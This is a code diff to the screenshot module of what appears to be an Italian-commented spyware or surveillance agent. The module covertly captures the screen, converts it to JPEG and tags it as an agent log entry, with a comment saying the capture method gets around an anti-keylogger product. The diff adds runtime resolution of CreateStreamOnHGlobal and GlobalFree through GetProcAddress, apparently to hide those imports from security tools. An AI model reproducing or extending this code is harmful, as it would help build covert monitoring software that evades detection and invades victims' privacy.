@@ -4,12 +4,22 @@
 #include "proto.h"
 using namespace Gdiplus;
 
+typedef  HRESULT (WINAPI *CreateStreamOnHGlobal_p)(
+  _In_   HGLOBAL hGlobal,
+  _In_   BOOL fDeleteOnRelease,
+  _Out_  LPSTREAM *ppstm
+);
+
+typedef HGLOBAL (WINAPI *GlobalFree_p)(
+  _In_  HGLOBAL hMem
+);
 
 BOOL IsAero()
 {
+	
 	HKEY hKey;
 	DWORD composition=0, len=sizeof(DWORD);
-
+	
 	if(RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\DWM", 0, KEY_READ, &hKey) != ERROR_SUCCESS) 
 		return FALSE;
 
@@ -30,7 +40,7 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 {
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes
-
+   
    ImageCodecInfo* pImageCodecInfo = NULL;
 
    GetImageEncodersSize(&num, &size);
@@ -58,6 +68,7 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 
 PBYTE JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
 {
+	
 	HGLOBAL hBuffer = NULL, hBufferDst = NULL;
 	void *pBuffer = NULL, *pBufferDst = NULL;
 	IStream *pStream = NULL, *pStreamDst = NULL;
@@ -67,7 +78,7 @@ PBYTE JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
 	CLSID   encoderClsid;
 	Image *image = NULL;
 	EncoderParameters encoderParameters;
-
+	
 	if (!sizeDst)
 	{
 #ifdef _DEBUG
@@ -78,7 +89,7 @@ PBYTE JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
 	*sizeDst = 0;
 
 	CoInitialize(NULL);
-
+	
 	if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok) 
 	{
 		CoUninitialize();
@@ -96,7 +107,7 @@ PBYTE JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
 #endif
 		return NULL;
 	}
-
+	
    encoderParameters.Count = 1;
    encoderParameters.Parameter[0].Guid = EncoderQuality;
    encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
@@ -113,7 +124,7 @@ PBYTE JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
 #endif
 		return NULL;
 	}
-
+	
 	pBuffer = GlobalLock(hBuffer);
 	if (!pBuffer) 
 	{
@@ -125,44 +136,59 @@ PBYTE JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
 		CoUninitialize();
 		return NULL;
 	}
-
-	CopyMemory(pBuffer, dataptr, imageSize);
 	
-    if (CreateStreamOnHGlobal(hBuffer, FALSE, &pStream) == S_OK) {
+	
+	CopyMemory(pBuffer, dataptr, imageSize);
+	CreateStreamOnHGlobal_p fpCreateStreamOnHGlobal = (CreateStreamOnHGlobal_p) GetProcAddress(LoadLibrary(L"ole32"), "CreateStreamOnHGlobal");
+
+	GlobalFree_p fpGlobalFree = (GlobalFree_p) GetProcAddress(LoadLibrary(L"kernel32"), "GlobalFree");
+    if (fpCreateStreamOnHGlobal(hBuffer, FALSE, &pStream) == S_OK) 
+	{
 		image = new Image(pStream);
-		if (image) {
-			if (hBufferDst = GlobalAlloc(GMEM_MOVEABLE, imageSize)) {
-				if (pBufferDst = GlobalLock(hBufferDst)) {
-					if (CreateStreamOnHGlobal(hBufferDst, FALSE, &pStreamDst) == S_OK) {
-						if (image->Save(pStreamDst, &encoderClsid, &encoderParameters) == Ok) {							
+		if (image) 
+		{
+			if (hBufferDst = GlobalAlloc(GMEM_MOVEABLE, imageSize)) 
+			{
+				if (pBufferDst = GlobalLock(hBufferDst)) 
+				{
+					if (fpCreateStreamOnHGlobal(hBufferDst, FALSE, &pStreamDst) == S_OK) 
+					{
+						if (image->Save(pStreamDst, &encoderClsid, &encoderParameters) == Ok) 
+						{		
+							
 							ULARGE_INTEGER position;
 							LARGE_INTEGER null_int;
 							DWORD dummy;
 							null_int.HighPart = null_int.LowPart = 0;
-							if (pStreamDst->Seek(null_int, STREAM_SEEK_CUR, &position) == S_OK) {
-								if (dataptrDst = (BYTE *)malloc(position.LowPart)) {
+							if (pStreamDst->Seek(null_int, STREAM_SEEK_CUR, &position) == S_OK) 
+							{
+								if (dataptrDst = (BYTE *)malloc(position.LowPart)) 
+								{
 									*sizeDst = position.LowPart;
 									pStreamDst->Seek(null_int, STREAM_SEEK_SET, &position);
 									pStreamDst->Read(dataptrDst, *sizeDst, &dummy);
 								}
 							}
+						
 						}
 						pStreamDst->Release();
+					
 					}
-					GlobalUnlock(hBufferDst);
+					GlobalUnlock(hBufferDst);		
 				}
-				GlobalFree(hBufferDst);
+				GlobalFree(hBufferDst);		
 			}
-			delete image;
+			delete image;	
 		}
 		pStream->Release();
 	}
-
+	
 	GlobalUnlock(hBuffer);
-    GlobalFree(hBuffer);
+    fpGlobalFree(hBuffer);
 	GdiplusShutdown(gdiplusToken);
     CoUninitialize();
-
+	
+	
     return dataptrDst;
 }
 
@@ -174,7 +200,7 @@ PBYTE BmpToJpgLog(DWORD agent_tag, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *p
 	BITMAPFILEHEADER bmf = { };
 	PBYTE source_bmp = NULL, dest_jpg = NULL;
 	DWORD bmp_size, jpg_size;
-
+	
 	if (pBMI->biHeight * pBMI->biWidth * pBMI->biBitCount / 8 != cbData)
 	{
 #ifdef _DEBUG
@@ -209,7 +235,7 @@ PBYTE BmpToJpgLog(DWORD agent_tag, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *p
 	
 	free(source_bmp);
 	free(dest_jpg);
-
+	
 	return pBuffer;
 }
 
@@ -228,7 +254,7 @@ PBYTE TakeScreenshot(PULONG uOut)
 	BOOL is_aero;
 	WINDOWINFO wininfo;
 	int winx, winy;
-
+	
 	// Tutto il display. Viene calcolato dalla foreground window
 	// per aggirare AdvancedAntiKeylogger
 	HWND grabwind = GetForegroundWindow();
@@ -327,41 +353,6 @@ PBYTE TakeScreenshot(PULONG uOut)
 	if (GetDIBits(hdccap, hbmcap, 0, g_yscdim, (BYTE *)pdwFullBits, (BITMAPINFO *)&bmiHeader, DIB_RGB_COLORS)) 
 	{
 		pScreenShotBuffer = BmpToJpgLog(PM_SCREENSHOT, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, 50, uOut);
-		/*
-		// Prende il titolo della finestra
-		WCHAR svTitle[512];
-		memset(svTitle, 0, sizeof(svTitle));
-		wsprintfW((LPWSTR)svTitle, L"UNKNOWN");
-
-		//Prende il nome della finestra e del processo per scriverlo nell'header
-		DWORD dwProcessId = 0;
-		WCHAR *proc_name = NULL;
-		SNAPSHOT_ADDITION_HEADER *pSnapAdditionalHeader;
-		BYTE *log_header;
-		DWORD additional_len;
-
-		proc_name = wcsdup(L"UNKNOWN");
-
-		additional_len = sizeof(SNAPSHOT_ADDITION_HEADER) + wcslen(proc_name)*sizeof(WCHAR) + wcslen(svTitle)*sizeof(WCHAR);
-		log_header = (PBYTE)malloc(additional_len);
-		if (log_header) 
-		{
-			// Crea l'header addizionale
-			pSnapAdditionalHeader = (PSNAPSHOT_ADDITION_HEADER)log_header;
-			pSnapAdditionalHeader->uVersion = LOG_SNAP_VERSION;
-			pSnapAdditionalHeader->uProcessNameLen = wcslen(proc_name)*sizeof(WCHAR);
-			pSnapAdditionalHeader->uWindowNameLen = wcslen(svTitle)*sizeof(WCHAR);
-			log_header += sizeof(SNAPSHOT_ADDITION_HEADER);
-			memcpy(log_header, proc_name, pSnapAdditionalHeader->uProcessNameLen);
-			log_header += pSnapAdditionalHeader->uProcessNameLen;
-			memcpy(log_header, svTitle, pSnapAdditionalHeader->uWindowNameLen);
-
-			pScreenShotBuffer = BmpToJpgLog(PM_SCREENSHOT, (PBYTE)pSnapAdditionalHeader, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, 50);
-
-			free(pSnapAdditionalHeader);
-			free(proc_name);
-		}
-			*/
 	}
 
 	// Rilascio oggetti....
@@ -379,7 +370,7 @@ PBYTE TakeScreenshot(PULONG uOut)
 			ReleaseDC(grabwind, g_hScrDC);
 
 	free(pdwFullBits);
-
+	
 	return pScreenShotBuffer;
 }
 
